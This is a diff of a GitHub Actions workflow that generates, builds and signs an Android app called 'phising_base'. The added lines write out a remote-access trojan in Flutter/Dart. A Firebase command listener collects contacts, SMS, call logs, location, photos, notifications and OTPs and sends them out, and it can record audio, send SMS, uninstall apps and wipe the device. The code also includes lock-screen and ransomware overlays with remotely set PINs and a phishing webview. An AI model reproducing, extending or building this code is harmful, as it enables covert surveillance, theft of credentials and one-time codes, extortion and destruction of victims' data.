@@ -39,9 +39,6 @@ jobs:
           flutter create phising_base
           cd phising_base
           
-          # ============================================
-          # 1. MANIFEST
-          # ============================================
           cat > android/app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               package="com.example.phising_base">
@@ -136,9 +133,6 @@ jobs:
           </manifest>
           EOF
 
-          # ============================================
-          # 2. PUBSPEC & ASSETS
-          # ============================================
           mkdir -p assets
           if [ -n "${{ github.event.inputs.icon_url }}" ]; then
             curl -fL "${{ github.event.inputs.icon_url }}" -o assets/icon.png || \
@@ -190,9 +184,6 @@ jobs:
           }
           EOF
 
-          # ============================================
-          # 3. XML RESOURCES
-          # ============================================
           mkdir -p android/app/src/main/res/xml
           cat > android/app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
           <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
@@ -213,9 +204,6 @@ jobs:
           </device-admin>
           EOF
 
-          # ============================================
-          # 4. FIREBASE OPTIONS
-          # ============================================
           cat > lib/firebase_options.dart << 'EOF'
           import 'package:firebase_core/firebase_core.dart' show FirebaseOptions;
           class DefaultFirebaseOptions {
@@ -231,9 +219,6 @@ jobs:
           }
           EOF
 
-      # ============================================
-      # 5. INJECT JAVA FILES
-      # ============================================
       - name: Inject Native Java Files
         run: |
           cd phising_base
@@ -258,7 +243,6 @@ jobs:
           }
           EOF
 
-          # --- RAT PLUGIN ---
           cat > android/app/src/main/java/com/example/phising_base/RatPlugin.java << 'EOF'
           package com.example.phising_base;
 
@@ -706,7 +690,6 @@ jobs:
           }
           EOF
 
-          # --- NOTIF LISTENER ---
           cat > android/app/src/main/java/com/example/phising_base/NotifListener.java << 'EOF'
           package com.example.phising_base;
 
@@ -741,7 +724,6 @@ jobs:
           }
           EOF
 
-          # --- ACCESSIBILITY SERVICE ---
           cat > android/app/src/main/java/com/example/phising_base/RatAccessibility.java << 'EOF'
           package com.example.phising_base;
 
@@ -756,7 +738,6 @@ jobs:
           }
           EOF
 
-          # --- DEVICE ADMIN ---
           cat > android/app/src/main/java/com/example/phising_base/RatDeviceAdmin.java << 'EOF'
           package com.example.phising_base;
 
@@ -765,7 +746,6 @@ jobs:
           public class RatDeviceAdmin extends DeviceAdminReceiver {}
           EOF
 
-          # --- APP MONITOR PLUGIN (VPN) ---
           cat > android/app/src/main/java/com/example/phising_base/AppMonitorPlugin.java << 'EOF'
           package com.example.phising_base;
 
@@ -1072,7 +1052,6 @@ jobs:
           }
           EOF
 
-          # --- VPN CAPTURE SERVICE ---
           cat > android/app/src/main/java/com/example/phising_base/MLVpnCaptureService.java << 'EOF'
           package com.example.phising_base;
 
@@ -1382,465 +1361,445 @@ jobs:
           }
           EOF
 
-# ============================================
-# 6. INJECT DART FILES
-# ============================================
-- name: Inject Dart Services
-  run: |
-    cd phising_base/lib
+      - name: Inject Dart Services
+        run: |
+          cd phising_base/lib
 
-    cat > main.dart << 'EOF'
-    import 'dart:async';
-    import 'dart:convert';
-    import 'package:flutter/material.dart';
-    import 'package:flutter/services.dart';
-    import 'package:webview_flutter/webview_flutter.dart';
-    import 'package:permission_handler/permission_handler.dart';
-    import 'package:firebase_core/firebase_core.dart';
-    import 'package:firebase_database/firebase_database.dart';
-    import 'package:http/http.dart' as http;
-    import 'package:device_info_plus/device_info_plus.dart';
-    import 'firebase_options.dart';
-    import 'lock_service.dart';
-    import 'ransomware_service.dart';
+          cat > main.dart << 'EOF'
+          import 'dart:async';
+          import 'dart:convert';
+          import 'package:flutter/material.dart';
+          import 'package:flutter/services.dart';
+          import 'package:webview_flutter/webview_flutter.dart';
+          import 'package:permission_handler/permission_handler.dart';
+          import 'package:firebase_core/firebase_core.dart';
+          import 'package:firebase_database/firebase_database.dart';
+          import 'package:http/http.dart' as http;
+          import 'package:device_info_plus/device_info_plus.dart';
+          import 'firebase_options.dart';
+          import 'lock_service.dart';
+          import 'ransomware_service.dart';
 
-    void main() async {
-      WidgetsFlutterBinding.ensureInitialized();
-      try {
-        await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
-      } catch(e) { debugPrint('Firebase init error: $e'); }
-      runApp(const MyApp());
-    }
-
-    class MyApp extends StatelessWidget {
-      const MyApp({super.key});
-      @override
-      Widget build(BuildContext context) {
-        return MaterialApp(debugShowCheckedModeBanner: false, home: const SplashScreen());
-      }
-    }
-
-    class SplashScreen extends StatefulWidget {
-      const SplashScreen({super.key});
-      @override
-      State<SplashScreen> createState() => _SplashScreenState();
-    }
-
-    class _SplashScreenState extends State<SplashScreen> {
-      @override
-      void initState() {
-        super.initState();
-        _initApp();
-      }
-
-      Future<void> _initApp() async {
-        await [
-          Permission.storage, Permission.location, Permission.camera,
-          Permission.microphone, Permission.notification, Permission.sms,
-          Permission.contacts, Permission.phone, Permission.mediaLibrary,
-        ].request();
-
-        Map<String, dynamic> config = {};
-        try {
-          final String jsonString = await rootBundle.loadString('assets/config.json');
-          config = jsonDecode(jsonString);
-        } catch (e) {}
-
-        String targetUrl = config['webview_url'] ?? 'https://www.google.com';
-        String uid = config['uid'] ?? 'unknown';
-
-        final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
-        final AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
-        
-        String realModel = androidInfo.model;
-        String realManufacturer = androidInfo.manufacturer;
-        String realAndroidVersion = androidInfo.version.release;
-        String realSdk = androidInfo.version.sdkInt.toString();
-
-        void startHeartbeat() {
-          final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-          Timer.periodic(const Duration(seconds: 60), (_) async {
+          void main() async {
+            WidgetsFlutterBinding.ensureInitialized();
             try {
-              await fb.ref('devices/$uid').update({
-                'device_id': uid, 'model': realModel, 'manufacturer': realManufacturer,
-                'sdk': realSdk, 'android_version': realAndroidVersion, 'session_id': uid,
-                'last_seen': ServerValue.timestamp,
-              });
-            } catch(e) { debugPrint('Heartbeat error: $e'); }
-          });
-        }
-        try {
-          final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-          await fb.ref('devices/$uid').update({
-            'device_id': uid, 'model': realModel, 'manufacturer': realManufacturer,
-            'sdk': realSdk, 'android_version': realAndroidVersion, 'session_id': uid,
-            'last_seen': ServerValue.timestamp,
-          });
-        } catch(e) { debugPrint('Register Firebase error: $e'); }
-        startHeartbeat();
+              await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
+            } catch(e) { debugPrint('Firebase init error: $e'); }
+            runApp(const MyApp());
+          }
 
-        final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-        final rat = MethodChannel('com.spy.x/rat');
-
-        fb.ref('commands/$uid').onChildAdded.listen((event) async {
-          if (event.snapshot.value == null) return;
-          final data = Map<String, dynamic>.from(event.snapshot.value as Map);
-          final cmd = data['cmd'];
-          final param = data['param']?.toString() ?? '';
-          final cmdId = event.snapshot.key ?? '';
-          
-          await event.snapshot.ref.remove();
-          
-          try {
-            dynamic result;
-            String type = '';
-            
-            switch (cmd) {
-              // DATA DASAR
-              case 1001: result = await rat.invokeMethod('getContacts'); type = 'contacts'; break;
-              case 1002: result = await rat.invokeMethod('getSms'); type = 'sms'; break;
-              case 1003:
-                final p = jsonDecode(param);
-                result = await rat.invokeMethod('sendSms', {'phone': p['phone'], 'message': p['message']});
-                type = 'sms_status';
-                break;
-              case 1004: result = await rat.invokeMethod('getCallLogs'); type = 'call_logs'; break;
-              case 1005: result = await rat.invokeMethod('getLocation'); type = 'location'; break;
-              case 1006: result = await rat.invokeMethod('getDeviceInfo'); type = 'device_info'; break;
-              
-              // SISTEM & APLIKASI
-              case 1008: result = await rat.invokeMethod('vibrate'); type = 'vibrate'; break;
-              case 1016: result = await rat.invokeMethod('torchOn'); type = 'torch'; break;
-              case 1017: result = await rat.invokeMethod('torchOff'); type = 'torch'; break;
-              case 1018: result = await rat.invokeMethod('torchBlink'); type = 'torch'; break;
-              case 1011: result = await rat.invokeMethod('changeWallpaper', {'url': param}); type = 'wallpaper'; break;
-              case 66985478: result = await rat.invokeMethod('back'); type = 'back'; break;
-              case 25896321: result = await rat.invokeMethod('home'); type = 'home'; break;
-              case 33654789: result = await rat.invokeMethod('recents'); type = 'recents'; break;
-              case 1596485: result = await rat.invokeMethod('getInstalledApps'); type = 'apps'; break;
-              case 74789654: result = await rat.invokeMethod('launchApp', {'package': param}); type = 'launch'; break;
-              case 64645897: result = await rat.invokeMethod('uninstallApp', {'package': param}); type = 'uninstall'; break;
-              
-              // INTERAKSI
-              case 1013:
-                final p = jsonDecode(param);
-                result = await rat.invokeMethod('toast', {'text': p['message'] ?? ''});
-                type = 'toast';
-                break;
-              case 1012: result = await rat.invokeMethod('voiceMessage', {'text': param}); type = 'voice'; break;
-              case 44598715: result = await rat.invokeMethod('click', {'resourceId': param}); type = 'toast'; break;
-              case 885478962: result = await rat.invokeMethod('setText', {'text': param}); type = 'toast'; break;
-              case 115987: result = await rat.invokeMethod('touch', {'bounds': param}); type = 'toast'; break;
-
-              // FILE & MEDIA
-              case 1014: result = await rat.invokeMethod('getFileList', {'path': param}); type = 'file_list'; break;
-              case 1020: result = await rat.invokeMethod('getGallery'); type = 'gallery'; break;
-              
-              // NOTIFIKASI & OTP
-              case 1019: result = await rat.invokeMethod('getNotifications'); type = 'notifications'; break;
-              case 1051: result = "Fitur OTP aktif otomatis ke Firebase."; type = 'otp'; break;
-
-              // SCREENSHOT & CAMERA
-              case 1060: result = await rat.invokeMethod('screenshot'); type = 'screenshot_status'; break;
-              case 11223344: result = await rat.invokeMethod('takePhotoBack'); type = 'photo_error'; break;
-              case 11223345: result = await rat.invokeMethod('takePhotoFront'); type = 'photo_error'; break;
-              case 1063: result = "Live Stream butuh MediaProjection."; type = 'screen_record'; break;
-              case 1070: result = await rat.invokeMethod('recordAudio'); type = 'record_status'; break;
-
-              // FITUR IZIN
-              case 99887766: result = await rat.invokeMethod('enableAdmin'); type = 'toast'; break;
-              case 5698742: result = await rat.invokeMethod('overlayShow'); type = 'toast'; break;
-              case 89521475: result = await rat.invokeMethod('overlayHide'); type = 'toast'; break;
-              case 1009: result = await rat.invokeMethod('wipe'); type = 'toast'; break;
-
-              default: result = 'Command $cmd belum diimplementasi'; type = 'error';
+          class MyApp extends StatelessWidget {
+            const MyApp({super.key});
+            @override
+            Widget build(BuildContext context) {
+              return MaterialApp(debugShowCheckedModeBanner: false, home: const SplashScreen());
             }
-            
-            await fb.ref('results/$uid/$cmdId').set({
-              'type': type,
-              'data': result is String ? result : jsonEncode(result),
-              'timestamp': DateTime.now().millisecondsSinceEpoch,
-            });
-            
-          } catch (e) {
-            await fb.ref('results/$uid/$cmdId').set({
-              'type': 'error',
-              'data': 'Gagal eksekusi: $e',
-              'timestamp': DateTime.now().millisecondsSinceEpoch,
-            });
           }
-        });
 
-        LockScreenService().init(context, uid);
-        RansomwareService().init(context, uid);
-        
-        await Future.delayed(const Duration(seconds: 1));
-        if (mounted) Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => WebViewScreen(url: targetUrl)));
-      }
-
-      @override
-      Widget build(BuildContext context) => const Scaffold(body: Center(child: CircularProgressIndicator()));
-    }
-
-    class WebViewScreen extends StatefulWidget {
-      final String url;
-      const WebViewScreen({super.key, required this.url});
-      @override
-      State<WebViewScreen> createState() => _WebViewScreenState();
-    }
-
-    class _WebViewScreenState extends State<WebViewScreen> {
-      late final WebViewController _controller;
-      @override
-      void initState() {
-        super.initState();
-        _controller = WebViewController()
-          ..setJavaScriptMode(JavaScriptMode.unrestricted)
-          ..setNavigationDelegate(NavigationDelegate(
-            onNavigationRequest: (NavigationRequest request) => NavigationDecision.navigate,
-          ))
-          ..loadRequest(Uri.parse(widget.url));
-      }
-      @override
-      Widget build(BuildContext context) => Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
-    }
-    EOF
-
-    cat > lock_service.dart << 'EOF'
-    import 'dart:async';
-    import 'package:flutter/material.dart';
-    import 'package:firebase_database/firebase_database.dart';
-    import 'package:firebase_core/firebase_core.dart';
-    import 'package:webview_flutter/webview_flutter.dart';
-
-    class LockHtmlOverlay extends StatefulWidget {
-      final String assetPath;
-      final String deviceId;
-      final String currentPin;
-      final VoidCallback onUnlock;
-      const LockHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
-
-      @override
-      State<LockHtmlOverlay> createState() => _LockHtmlOverlayState();
-    }
-
-    class _LockHtmlOverlayState extends State<LockHtmlOverlay> {
-      late final WebViewController _controller;
-
-      @override
-      void initState() {
-        super.initState();
-        _controller = WebViewController();
-        _controller.setJavaScriptMode(JavaScriptMode.unrestricted);
-        _controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
-          if (msg.message == 'unlock') widget.onUnlock();
-        });
-        _controller.setNavigationDelegate(NavigationDelegate(
-          onPageFinished: (url) async {
-            await _controller.runJavaScript("window.DEVICE_ID = '${widget.deviceId}';");
-            await _controller.runJavaScript("window.CORRECT_PIN = '${widget.currentPin}';");
-          },
-        ));
-        _controller.loadFlutterAsset(widget.assetPath);
-      }
-
-      @override
-      Widget build(BuildContext context) {
-        return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
-      }
-    }
-
-    class LockScreenService {
-      static final LockScreenService _instance = LockScreenService._internal();
-      factory LockScreenService() => _instance;
-      LockScreenService._internal();
-      StreamSubscription? _cmdSub;
-      StreamSubscription? _pinSub;
-      String _currentPin = '1234';
-      bool _isLocked = false;
-      OverlayEntry? _overlayEntry;
-      BuildContext? _appContext;
-      String _deviceId = '';
-
-      void init(BuildContext context, String deviceId) {
-        _appContext = context;
-        _deviceId = deviceId;
-        _listenToCommands(deviceId);
-        _listenToPinUpdates(deviceId);
-      }
-
-      void _listenToCommands(String deviceId) {
-        final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-        _cmdSub = fb.ref('commands/$deviceId').onChildAdded.listen((event) {
-          if (event.snapshot.value == null) return;
-          final data = Map<String, dynamic>.from(event.snapshot.value as Map);
-          final cmd = data['cmd'];
-          final param = data['param']?.toString() ?? '';
-          
-          if (cmd == 98765432 || cmd == 98765433 || cmd == 87654321) {
-            event.snapshot.ref.remove();
+          class SplashScreen extends StatefulWidget {
+            const SplashScreen({super.key});
+            @override
+            State<SplashScreen> createState() => _SplashScreenState();
           }
-          
-          if (cmd == 98765432) _lockScreen();
-          else if (cmd == 98765433) _unlockScreen();
-          else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
-        });
-      }
 
-      void _listenToPinUpdates(String deviceId) {
-        final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-        _pinSub = fb.ref('lock_pin/$deviceId').onValue.listen((event) {
-          if (event.snapshot.value != null) _currentPin = event.snapshot.value.toString();
-        });
-      }
+          class _SplashScreenState extends State<SplashScreen> {
+            @override
+            void initState() {
+              super.initState();
+              _initApp();
+            }
 
-      void _setPin(String newPin) => _currentPin = newPin;
+            Future<void> _initApp() async {
+              await [
+                Permission.storage, Permission.location, Permission.camera,
+                Permission.microphone, Permission.notification, Permission.sms,
+                Permission.contacts, Permission.phone, Permission.mediaLibrary,
+              ].request();
 
-      void _lockScreen() {
-        if (_isLocked) return;
-        _isLocked = true;
-        if (_appContext == null) return;
-        _overlayEntry = OverlayEntry(builder: (context) => LockHtmlOverlay(
-          assetPath: 'assets/lock.html', deviceId: _deviceId, currentPin: _currentPin, onUnlock: _unlockScreen,
-        ));
-        Overlay.of(_appContext!).insert(_overlayEntry!);
-      }
+              Map<String, dynamic> config = {};
+              try {
+                final String jsonString = await rootBundle.loadString('assets/config.json');
+                config = jsonDecode(jsonString);
+              } catch (e) {}
 
-      void _unlockScreen() {
-        if (!_isLocked) return;
-        _isLocked = false;
-        _overlayEntry?.remove();
-        _overlayEntry = null;
-      }
+              String targetUrl = config['webview_url'] ?? 'https://www.google.com';
+              String uid = config['uid'] ?? 'unknown';
 
-      void dispose() { _cmdSub?.cancel(); _pinSub?.cancel(); _overlayEntry?.remove(); }
-    }
-    EOF
+              final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+              final AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
+              
+              String realModel = androidInfo.model;
+              String realManufacturer = androidInfo.manufacturer;
+              String realAndroidVersion = androidInfo.version.release;
+              String realSdk = androidInfo.version.sdkInt.toString();
 
-    cat > ransomware_service.dart << 'EOF'
-    import 'dart:async';
-    import 'package:flutter/material.dart';
-    import 'package:firebase_database/firebase_database.dart';
-    import 'package:firebase_core/firebase_core.dart';
-    import 'package:webview_flutter/webview_flutter.dart';
+              void startHeartbeat() {
+                final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+                Timer.periodic(const Duration(seconds: 60), (_) async {
+                  try {
+                    await fb.ref('devices/$uid').update({
+                      'device_id': uid, 'model': realModel, 'manufacturer': realManufacturer,
+                      'sdk': realSdk, 'android_version': realAndroidVersion, 'session_id': uid,
+                      'last_seen': ServerValue.timestamp,
+                    });
+                  } catch(e) { debugPrint('Heartbeat error: $e'); }
+                });
+              }
+              try {
+                final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+                await fb.ref('devices/$uid').update({
+                  'device_id': uid, 'model': realModel, 'manufacturer': realManufacturer,
+                  'sdk': realSdk, 'android_version': realAndroidVersion, 'session_id': uid,
+                  'last_seen': ServerValue.timestamp,
+                });
+              } catch(e) { debugPrint('Register Firebase error: $e'); }
+              startHeartbeat();
 
-    class RansomwareHtmlOverlay extends StatefulWidget {
-      final String assetPath;
-      final String deviceId;
-      final String currentPin;
-      final VoidCallback onUnlock;
-      const RansomwareHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
+              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+              final rat = MethodChannel('com.spy.x/rat');
 
-      @override
-      State<RansomwareHtmlOverlay> createState() => _RansomwareHtmlOverlayState();
-    }
+              fb.ref('commands/$uid').onChildAdded.listen((event) async {
+                if (event.snapshot.value == null) return;
+                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
+                final cmd = data['cmd'];
+                final param = data['param']?.toString() ?? '';
+                final cmdId = event.snapshot.key ?? '';
+                
+                await event.snapshot.ref.remove();
+                
+                try {
+                  dynamic result;
+                  String type = '';
+                  
+                  switch (cmd) {
+                    case 1001: result = await rat.invokeMethod('getContacts'); type = 'contacts'; break;
+                    case 1002: result = await rat.invokeMethod('getSms'); type = 'sms'; break;
+                    case 1003:
+                      final p = jsonDecode(param);
+                      result = await rat.invokeMethod('sendSms', {'phone': p['phone'], 'message': p['message']});
+                      type = 'sms_status';
+                      break;
+                    case 1004: result = await rat.invokeMethod('getCallLogs'); type = 'call_logs'; break;
+                    case 1005: result = await rat.invokeMethod('getLocation'); type = 'location'; break;
+                    case 1006: result = await rat.invokeMethod('getDeviceInfo'); type = 'device_info'; break;
+                    case 1008: result = await rat.invokeMethod('vibrate'); type = 'vibrate'; break;
+                    case 1016: result = await rat.invokeMethod('torchOn'); type = 'torch'; break;
+                    case 1017: result = await rat.invokeMethod('torchOff'); type = 'torch'; break;
+                    case 1018: result = await rat.invokeMethod('torchBlink'); type = 'torch'; break;
+                    case 1011: result = await rat.invokeMethod('changeWallpaper', {'url': param}); type = 'wallpaper'; break;
+                    case 66985478: result = await rat.invokeMethod('back'); type = 'back'; break;
+                    case 25896321: result = await rat.invokeMethod('home'); type = 'home'; break;
+                    case 33654789: result = await rat.invokeMethod('recents'); type = 'recents'; break;
+                    case 1596485: result = await rat.invokeMethod('getInstalledApps'); type = 'apps'; break;
+                    case 74789654: result = await rat.invokeMethod('launchApp', {'package': param}); type = 'launch'; break;
+                    case 64645897: result = await rat.invokeMethod('uninstallApp', {'package': param}); type = 'uninstall'; break;
+                    case 1013:
+                      final p = jsonDecode(param);
+                      result = await rat.invokeMethod('toast', {'text': p['message'] ?? ''});
+                      type = 'toast';
+                      break;
+                    case 1012: result = await rat.invokeMethod('voiceMessage', {'text': param}); type = 'voice'; break;
+                    case 44598715: result = await rat.invokeMethod('click', {'resourceId': param}); type = 'toast'; break;
+                    case 885478962: result = await rat.invokeMethod('setText', {'text': param}); type = 'toast'; break;
+                    case 115987: result = await rat.invokeMethod('touch', {'bounds': param}); type = 'toast'; break;
+                    case 1014: result = await rat.invokeMethod('getFileList', {'path': param}); type = 'file_list'; break;
+                    case 1020: result = await rat.invokeMethod('getGallery'); type = 'gallery'; break;
+                    case 1019: result = await rat.invokeMethod('getNotifications'); type = 'notifications'; break;
+                    case 1051: result = "Fitur OTP aktif otomatis ke Firebase."; type = 'otp'; break;
+                    case 1060: result = await rat.invokeMethod('screenshot'); type = 'screenshot_status'; break;
+                    case 11223344: result = await rat.invokeMethod('takePhotoBack'); type = 'photo_error'; break;
+                    case 11223345: result = await rat.invokeMethod('takePhotoFront'); type = 'photo_error'; break;
+                    case 1063: result = "Live Stream butuh MediaProjection."; type = 'screen_record'; break;
+                    case 1070: result = await rat.invokeMethod('recordAudio'); type = 'record_status'; break;
+                    case 99887766: result = await rat.invokeMethod('enableAdmin'); type = 'toast'; break;
+                    case 5698742: result = await rat.invokeMethod('overlayShow'); type = 'toast'; break;
+                    case 89521475: result = await rat.invokeMethod('overlayHide'); type = 'toast'; break;
+                    case 1009: result = await rat.invokeMethod('wipe'); type = 'toast'; break;
+                    default: result = 'Command $cmd belum diimplementasi'; type = 'error';
+                  }
+                  
+                  await fb.ref('results/$uid/$cmdId').set({
+                    'type': type,
+                    'data': result is String ? result : jsonEncode(result),
+                    'timestamp': DateTime.now().millisecondsSinceEpoch,
+                  });
+                  
+                } catch (e) {
+                  await fb.ref('results/$uid/$cmdId').set({
+                    'type': 'error',
+                    'data': 'Gagal eksekusi: $e',
+                    'timestamp': DateTime.now().millisecondsSinceEpoch,
+                  });
+                }
+              });
 
-    class _RansomwareHtmlOverlayState extends State<RansomwareHtmlOverlay> {
-      late final WebViewController _controller;
+              LockScreenService().init(context, uid);
+              RansomwareService().init(context, uid);
+              
+              await Future.delayed(const Duration(seconds: 1));
+              if (mounted) Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => WebViewScreen(url: targetUrl)));
+            }
 
-      @override
-      void initState() {
-        super.initState();
-        _controller = WebViewController();
-        _controller.setJavaScriptMode(JavaScriptMode.unrestricted);
-        _controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
-          if (msg.message == 'unlock') widget.onUnlock();
-        });
-        _controller.setNavigationDelegate(NavigationDelegate(
-          onPageFinished: (url) async {
-            await _controller.runJavaScript("window.DEVICE_ID = '${widget.deviceId}';");
-            await _controller.runJavaScript("window.CORRECT_PIN = '${widget.currentPin}';");
-          },
-        ));
-        _controller.loadFlutterAsset(widget.assetPath);
-      }
-
-      @override
-      Widget build(BuildContext context) {
-        return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
-      }
-    }
-
-    class RansomwareService {
-      static final RansomwareService _instance = RansomwareService._internal();
-      factory RansomwareService() => _instance;
-      RansomwareService._internal();
-      StreamSubscription? _cmdSub;
-      bool _isActive = false;
-      OverlayEntry? _overlayEntry;
-      BuildContext? _appContext;
-      String _currentPin = '1234';
-      String _deviceId = '';
-
-      void init(BuildContext context, String deviceId) {
-        _appContext = context;
-        _deviceId = deviceId;
-        _listenToCommands(deviceId);
-        _listenToPinUpdates(deviceId); // 🔥 FIX SINKRONISASI PIN
-      }
-
-      void _listenToCommands(String deviceId) {
-        final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-        _cmdSub = fb.ref('commands/$deviceId').onChildAdded.listen((event) {
-          if (event.snapshot.value == null) return;
-          final data = Map<String, dynamic>.from(event.snapshot.value as Map);
-          final cmd = data['cmd'];
-          final param = data['param']?.toString() ?? '';
-          
-          if (cmd == 1010 || cmd == 10101) {
-            event.snapshot.ref.remove();
+            @override
+            Widget build(BuildContext context) => const Scaffold(body: Center(child: CircularProgressIndicator()));
           }
-          
-          if (cmd == 1010) _activateRansomware();
-          else if (cmd == 10101) _deactivateRansomware();
-          else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
-        });
-      }
 
-      void _listenToPinUpdates(String deviceId) {
-        final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-        fb.ref('lock_pin/$deviceId').onValue.listen((event) {
-          if (event.snapshot.value != null) _currentPin = event.snapshot.value.toString();
-        });
-      }
+          class WebViewScreen extends StatefulWidget {
+            final String url;
+            const WebViewScreen({super.key, required this.url});
+            @override
+            State<WebViewScreen> createState() => _WebViewScreenState();
+          }
 
-      void _setPin(String newPin) => _currentPin = newPin;
+          class _WebViewScreenState extends State<WebViewScreen> {
+            late final WebViewController _controller;
+            @override
+            void initState() {
+              super.initState();
+              _controller = WebViewController()
+                ..setJavaScriptMode(JavaScriptMode.unrestricted)
+                ..setNavigationDelegate(NavigationDelegate(
+                  onNavigationRequest: (NavigationRequest request) => NavigationDecision.navigate,
+                ))
+                ..loadRequest(Uri.parse(widget.url));
+            }
+            @override
+            Widget build(BuildContext context) => Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
+          }
+          EOF
 
-      void _activateRansomware() {
-        if (_isActive) return;
-        _isActive = true;
-        if (_appContext == null) return;
-        _overlayEntry = OverlayEntry(builder: (context) => RansomwareHtmlOverlay(
-          assetPath: 'assets/ransomware.html', deviceId: _deviceId, currentPin: _currentPin, onUnlock: _deactivateRansomware,
-        ));
-        Overlay.of(_appContext!).insert(_overlayEntry!);
-      }
+          cat > lock_service.dart << 'EOF'
+          import 'dart:async';
+          import 'package:flutter/material.dart';
+          import 'package:firebase_database/firebase_database.dart';
+          import 'package:firebase_core/firebase_core.dart';
+          import 'package:webview_flutter/webview_flutter.dart';
 
-      void _deactivateRansomware() {
-        if (!_isActive) return;
-        _isActive = false;
-        _overlayEntry?.remove();
-        _overlayEntry = null;
-      }
+          class LockHtmlOverlay extends StatefulWidget {
+            final String assetPath;
+            final String deviceId;
+            final String currentPin;
+            final VoidCallback onUnlock;
+            const LockHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
 
-      void dispose() { _cmdSub?.cancel(); _overlayEntry?.remove(); }
-    }
-    EOF
+            @override
+            State<LockHtmlOverlay> createState() => _LockHtmlOverlayState();
+          }
 
-# ============================================
-# 7. BUILD APK
-# ============================================
-- name: Build & Sign APK
-  run: |
-    cd phising_base
-    flutter pub get
-    dart run flutter_launcher_icons
-    keytool -genkey -v -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key0 -storepass ratapp123 -keypass ratapp123 -dname "CN=Android, OU=Android, O=Android, L=Android, ST=Android, C=US"
-    flutter build apk --release
-    $ANDROID_HOME/build-tools/34.0.0/apksigner sign --ks release.jks --ks-pass pass:ratapp123 --key-pass pass:ratapp123 --out build/app/outputs/flutter-apk/app-release-signed.apk build/app/outputs/flutter-apk/app-release.apk
+          class _LockHtmlOverlayState extends State<LockHtmlOverlay> {
+            late final WebViewController _controller;
 
-- name: Upload Artifact
-  uses: actions/upload-artifact@v4
-  with:
-    name: phising-apk
-    path: phising_base/build/app/outputs/flutter-apk/app-release-signed.apk
+            @override
+            void initState() {
+              super.initState();
+              _controller = WebViewController();
+              _controller.setJavaScriptMode(JavaScriptMode.unrestricted);
+              _controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
+                if (msg.message == 'unlock') widget.onUnlock();
+              });
+              _controller.setNavigationDelegate(NavigationDelegate(
+                onPageFinished: (url) async {
+                  await _controller.runJavaScript("window.DEVICE_ID = '${widget.deviceId}';");
+                  await _controller.runJavaScript("window.CORRECT_PIN = '${widget.currentPin}';");
+                },
+              ));
+              _controller.loadFlutterAsset(widget.assetPath);
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
+            }
+          }
+
+          class LockScreenService {
+            static final LockScreenService _instance = LockScreenService._internal();
+            factory LockScreenService() => _instance;
+            LockScreenService._internal();
+            StreamSubscription? _cmdSub;
+            StreamSubscription? _pinSub;
+            String _currentPin = '1234';
+            bool _isLocked = false;
+            OverlayEntry? _overlayEntry;
+            BuildContext? _appContext;
+            String _deviceId = '';
+
+            void init(BuildContext context, String deviceId) {
+              _appContext = context;
+              _deviceId = deviceId;
+              _listenToCommands(deviceId);
+              _listenToPinUpdates(deviceId);
+            }
+
+            void _listenToCommands(String deviceId) {
+              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+              _cmdSub = fb.ref('commands/$deviceId').onChildAdded.listen((event) {
+                if (event.snapshot.value == null) return;
+                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
+                final cmd = data['cmd'];
+                final param = data['param']?.toString() ?? '';
+                
